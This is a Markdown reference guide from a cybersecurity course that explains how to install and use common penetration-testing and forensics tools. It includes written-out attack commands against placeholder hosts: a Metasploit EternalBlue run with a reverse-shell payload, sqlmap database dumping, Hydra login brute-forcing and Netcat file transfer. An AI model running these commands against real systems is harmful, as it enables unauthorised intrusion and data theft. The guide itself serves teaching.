# 🔒 Cybersecurity Tools Reference

> **UltraCube Learn-Library** | Cybersecurity Tools & Installation Guide  
> **Maintained by**: UltraCube Security Team  
> **Last Updated**: August 13, 2025

![Cybersecurity Tools Banner](https://via.placeholder.com/800x150/DC143C/FFFFFF?text=UltraCube+%7C+Cybersecurity+Tools+Reference)

---

## 🎯 Overview

This comprehensive guide covers essential cybersecurity tools used throughout the UltraCube Learn-Library cybersecurity curriculum. Each tool includes installation instructions, configuration guidance, and practical use cases.

## 🖥️ Operating System Setup

### 🐧 **Kali Linux** (Recommended)

**Description**: Debian-based Linux distribution specifically designed for penetration testing and security auditing.

#### Installation Methods

##### Option 1: Virtual Machine (Recommended for Beginners)

```bash
# Download Kali Linux VM
# Visit: https://www.kali.org/get-kali/#kali-virtual-machines

# For VirtualBox:
1. Download Kali Linux VirtualBox image
2. Import .ova file into VirtualBox
3. Allocate minimum 4GB RAM, 25GB storage
4. Default credentials: kali/kali
```

##### Option 2: WSL2 (Windows Subsystem for Linux)

```powershell
# Enable WSL2 and install Kali
wsl --install -d kali-linux

# Start Kali Linux
wsl -d kali-linux

# Update system
sudo apt update && sudo apt upgrade -y
```

##### Option 3: Native Installation

```bash
# Download ISO from: https://www.kali.org/get-kali/#kali-installer-images
# Create bootable USB using Rufus (Windows) or dd (Linux)
# Follow installation wizard

# Post-installation setup
sudo apt update && sudo apt upgrade -y
sudo apt install -y kali-tools-top10
```

### 🪟 **Windows Security Tools**

Essential tools for Windows-based security testing:

```powershell
# Install Chocolatey package manager
Set-ExecutionPolicy Bypass -Scope Process -Force
[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072
iex ((New-Object System.Net.WebClient).DownloadString('https://chocolatey.org/install.ps1'))

# Install security tools via Chocolatey
choco install wireshark nmap burpsuite-free-edition
```

---

## 🛠️ Essential Security Tools

### 🔍 **Network Analysis Tools**

#### **Wireshark** - Network Protocol Analyzer

**Purpose**: Capture and analyze network traffic in real-time.

##### Installation

```bash
# Ubuntu/Debian
sudo apt update
sudo apt install wireshark

# Add user to wireshark group
sudo usermod -a -G wireshark $USER

# CentOS/RHEL
sudo yum install wireshark wireshark-gnome

# macOS
brew install --cask wireshark

# Windows
# Download from: https://www.wireshark.org/download.html
```

##### Basic Usage

```bash
# Capture traffic on interface eth0
sudo wireshark -i eth0

# Capture to file
sudo tshark -i eth0 -w capture.pcap

# Read from file
wireshark capture.pcap

# Command-line analysis
tshark -r capture.pcap -Y "http"
```

##### Common Filters

```bash
# HTTP traffic
http

# Specific IP
ip.addr == 192.168.1.100

# TCP port 80
tcp.port == 80

# DNS queries
dns
```

#### **Nmap** - Network Mapper

**Purpose**: Network discovery and security auditing.

##### Installation

```bash
# Ubuntu/Debian
sudo apt install nmap

# CentOS/RHEL
sudo yum install nmap

# macOS
brew install nmap

# Windows
# Download from: https://nmap.org/download.html
```

##### Essential Commands

```bash
# Basic host discovery
nmap -sn 192.168.1.0/24

# TCP SYN scan
nmap -sS target.com

# Service version detection
nmap -sV target.com

# OS detection
nmap -O target.com

# Comprehensive scan
nmap -A target.com

# Scan specific ports
nmap -p 80,443,22 target.com

# NSE scripts
nmap --script vuln target.com
```

##### Useful Nmap Scripts

```bash
# Web vulnerability scanning
nmap --script http-vuln-* target.com

# SSL/TLS testing
nmap --script ssl-* target.com

# SMB enumeration
nmap --script smb-* target.com
```

### 🔓 **Penetration Testing Tools**

#### **Metasploit Framework** - Exploitation Framework

**Purpose**: Comprehensive penetration testing and exploit development platform.

##### Installation

```bash
# Kali Linux (pre-installed)
msfconsole

# Ubuntu/Debian
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
chmod 755 msfinstall
./msfinstall

# Update Metasploit
sudo msfupdate
```

##### Basic Usage

```bash
# Start Metasploit console
msfconsole

# Search for exploits
search type:exploit platform:windows

# Use specific exploit
use exploit/windows/smb/ms17_010_eternalblue

# Show exploit options
show options

# Set target
set RHOSTS 192.168.1.100

# Set payload
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.50

# Run exploit
exploit
```

##### Common Metasploit Commands

```bash
# In msfconsole:
help                    # Show help
search cve:2021        # Search by CVE
use auxiliary/scanner/smb/smb_version  # Use auxiliary module
show payloads          # List available payloads
sessions -l            # List active sessions
sessions -i 1          # Interact with session 1
```

#### **Burp Suite** - Web Application Security Testing

**Purpose**: Comprehensive web application security testing platform.

##### Installation

```bash
# Download from: https://portswigger.net/burp/communitydownload

# Kali Linux
sudo apt install burpsuite

# Manual installation
java -jar burpsuite_community.jar
```

##### Basic Configuration

```bash
# Configure proxy (default: 127.0.0.1:8080)
# Browser proxy settings:
HTTP Proxy: 127.0.0.1:8080
HTTPS Proxy: 127.0.0.1:8080

# Install Burp CA certificate
# Navigate to http://burp in browser
# Download CA certificate
# Install in browser certificate store
```

##### Essential Features

1. **Proxy**: Intercept and modify HTTP/HTTPS traffic
2. **Spider**: Automated web application crawling
3. **Scanner** (Pro only): Automated vulnerability scanning
4. **Repeater**: Manual request modification and testing
5. **Intruder**: Automated customized attacks
6. **Sequencer**: Random token analysis

#### **OWASP ZAP** - Web Application Security Scanner

**Purpose**: Free alternative to Burp Suite for web application security testing.

##### Installation

```bash
# Ubuntu/Debian
sudo apt install zaproxy

# Download from: https://www.zaproxy.org/download/

# Docker
docker run -t owasp/zap2docker-stable zap-baseline.py -t http://target.com
```

##### Basic Usage

```bash
# Start ZAP
zaproxy

# Command-line scanning
zap-baseline.py -t http://target.com

# Generate report
zap-baseline.py -t http://target.com -J zap-report.json
```

### 🔐 **Password & Hash Tools**

#### **John the Ripper** - Password Cracking Tool

**Purpose**: Fast password cracker supporting multiple hash types.

##### Installation

```bash
# Ubuntu/Debian
sudo apt install john

# Compile from source for better performance
git clone https://github.com/openwall/john
cd john/src
./configure && make
```

##### Basic Usage

```bash
# Crack password hashes
john hashes.txt

# Use specific wordlist
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# Show cracked passwords
john --show hashes.txt

# Crack specific hash type
john --format=md5 hashes.txt
```

#### **Hashcat** - Advanced Password Recovery

**Purpose**: GPU-accelerated password cracking tool.

##### Installation

```bash
# Ubuntu/Debian
sudo apt install hashcat

# Windows
# Download from: https://hashcat.net/hashcat/

# macOS
brew install hashcat
```

##### Basic Usage

```bash
# Crack MD5 hashes
hashcat -m 0 -a 0 hashes.txt wordlist.txt

# Crack WPA/WPA2
hashcat -m 2500 capture.hccapx wordlist.txt

# Show cracked passwords
hashcat -m 0 hashes.txt --show
```

### 🔎 **Forensics Tools**

#### **Volatility** - Memory Analysis Framework

**Purpose**: Advanced memory forensics and analysis.

##### Installation

```bash
# Python 2 version (Volatility 2)
pip install volatility

# Python 3 version (Volatility 3)
pip3 install volatility3

# Kali Linux
sudo apt install volatility
```

##### Basic Usage

```bash
# Identify OS profile
volatility -f memory.dump imageinfo

# List processes
volatility -f memory.dump --profile=Win7SP1x64 pslist

# Dump process
volatility -f memory.dump --profile=Win7SP1x64 procdump -p 1234 -D ./
```

#### **Autopsy** - Digital Forensics Platform

**Purpose**: Graphical interface for digital forensics analysis.

##### Installation

```bash
# Download from: https://www.sleuthkit.org/autopsy/

# Ubuntu/Debian
sudo apt install autopsy

# Windows
# Download installer from official website
```

---

## 🌐 **Web Security Tools**

### **Nikto** - Web Server Scanner

```bash
# Installation
sudo apt install nikto

# Basic scan
nikto -h http://target.com

# Scan with specific options
nikto -h http://target.com -p 80,443 -ssl
```

### **SQLMap** - SQL Injection Tool

```bash
# Installation (pre-installed in Kali)
sudo apt install sqlmap

# Basic SQL injection test
sqlmap -u "http://target.com/page?id=1"

# Test with cookies
sqlmap -u "http://target.com/page" --cookie="PHPSESSID=abc123"

# Dump database
sqlmap -u "http://target.com/page?id=1" --dbs
```

### **Gobuster** - Directory/File Brute-forcer

```bash
# Installation
sudo apt install gobuster

# Directory brute-force
gobuster dir -u http://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

# DNS subdomain brute-force
gobuster dns -d target.com -w /usr/share/wordlists/subdomains.txt
```

---

## 📱 **Mobile Security Tools**

### **MobSF** - Mobile Security Framework

```bash
# Installation via Docker
docker pull opensecurity/mobsf
docker run -it -p 8000:8000 opensecurity/mobsf

# Manual installation
git clone https://github.com/MobSF/Mobile-Security-Framework-MobSF.git
cd Mobile-Security-Framework-MobSF
./setup.sh
./run.sh
```

### **ADB** - Android Debug Bridge

```bash
# Installation
sudo apt install android-tools-adb

# Connect to device
adb devices

# Install APK
adb install app.apk

# Pull file from device
adb pull /data/data/com.app/databases/app.db
```

---

## 🔧 **Additional Utilities**

### **Netcat** - Network Swiss Army Knife

```bash
# Listen on port
nc -lvp 4444

# Connect to host
nc target.com 80

# File transfer
# Receiver: nc -lvp 4444 > file.txt
# Sender: nc target.com 4444 < file.txt
```

### **Hydra** - Network Login Cracker

```bash
# Installation
sudo apt install hydra

# SSH brute-force
hydra -l admin -P passwords.txt ssh://target.com

# Web form brute-force
hydra -l admin -P passwords.txt target.com http-post-form "/login:username=^USER^&password=^PASS^:Failed"
```

### **BeEF** - Browser Exploitation Framework

```bash
# Installation
sudo apt install beef-xss

# Start BeEF
sudo beef-xss

# Access: http://127.0.0.1:3000/ui/panel
# Default: beef/beef
```

---

## 📋 **Tool Categories Summary**

### 🔍 **Reconnaissance**
- **Nmap**: Network discovery and port scanning
- **Masscan**: High-speed port scanner
- **Recon-ng**: Web reconnaissance framework

### 🚪 **Exploitation**
- **Metasploit**: Comprehensive exploitation framework
- **ExploitDB**: Database of exploits and vulnerabilities
- **SET**: Social Engineering Toolkit

### 🌐 **Web Application Testing**
- **Burp Suite**: Professional web application security testing
- **OWASP ZAP**: Free web application security scanner
- **Nikto**: Web server scanner

### 🔐 **Password Attacks**
- **John the Ripper**: Multi-platform password cracker
- **Hashcat**: GPU-accelerated password recovery
- **Hydra**: Network login cracker

### 📊 **Analysis & Forensics**
- **Wireshark**: Network protocol analyzer
- **Volatility**: Memory forensics framework
- **Autopsy**: Digital forensics platform

---

## 🎯 **Learning Path Integration**

These tools are integrated throughout our cybersecurity curriculum:

- **[Foundations Track](../library/cybersecurity/foundations/)**: Basic tool introduction
- **[Red Team Track](../library/cybersecurity/red-team/)**: Offensive security tools
- **[Blue Team Track](../library/cybersecurity/blue-team/)**: Defensive security tools
- **[DevSecOps Track](../library/cybersecurity/devsecops/)**: Security automation tools

## 🆘 **Support & Resources**

### 📚 **Additional Learning**
- Tool-specific documentation and man pages
- Video tutorials in our [docs/video-resources.md](../docs/video-resources.md)
- Community discussions and Q&A

### 🐛 **Issues & Updates**
- Report tool-related issues in our GitHub repository
- Suggest new tools or improvements
- Contribute installation scripts and configurations

---

## 📝 **License & Attribution**

This tool reference guide is part of the **UltraCube Learn-Library** project.

**Created by**: UltraCube Security Team  
**License**: MIT License  
**Website**: [ucubetech.com](https://www.ucubetech.com)

---

*Tools and technologies referenced are trademarks of their respective owners. This guide is for educational purposes only.*
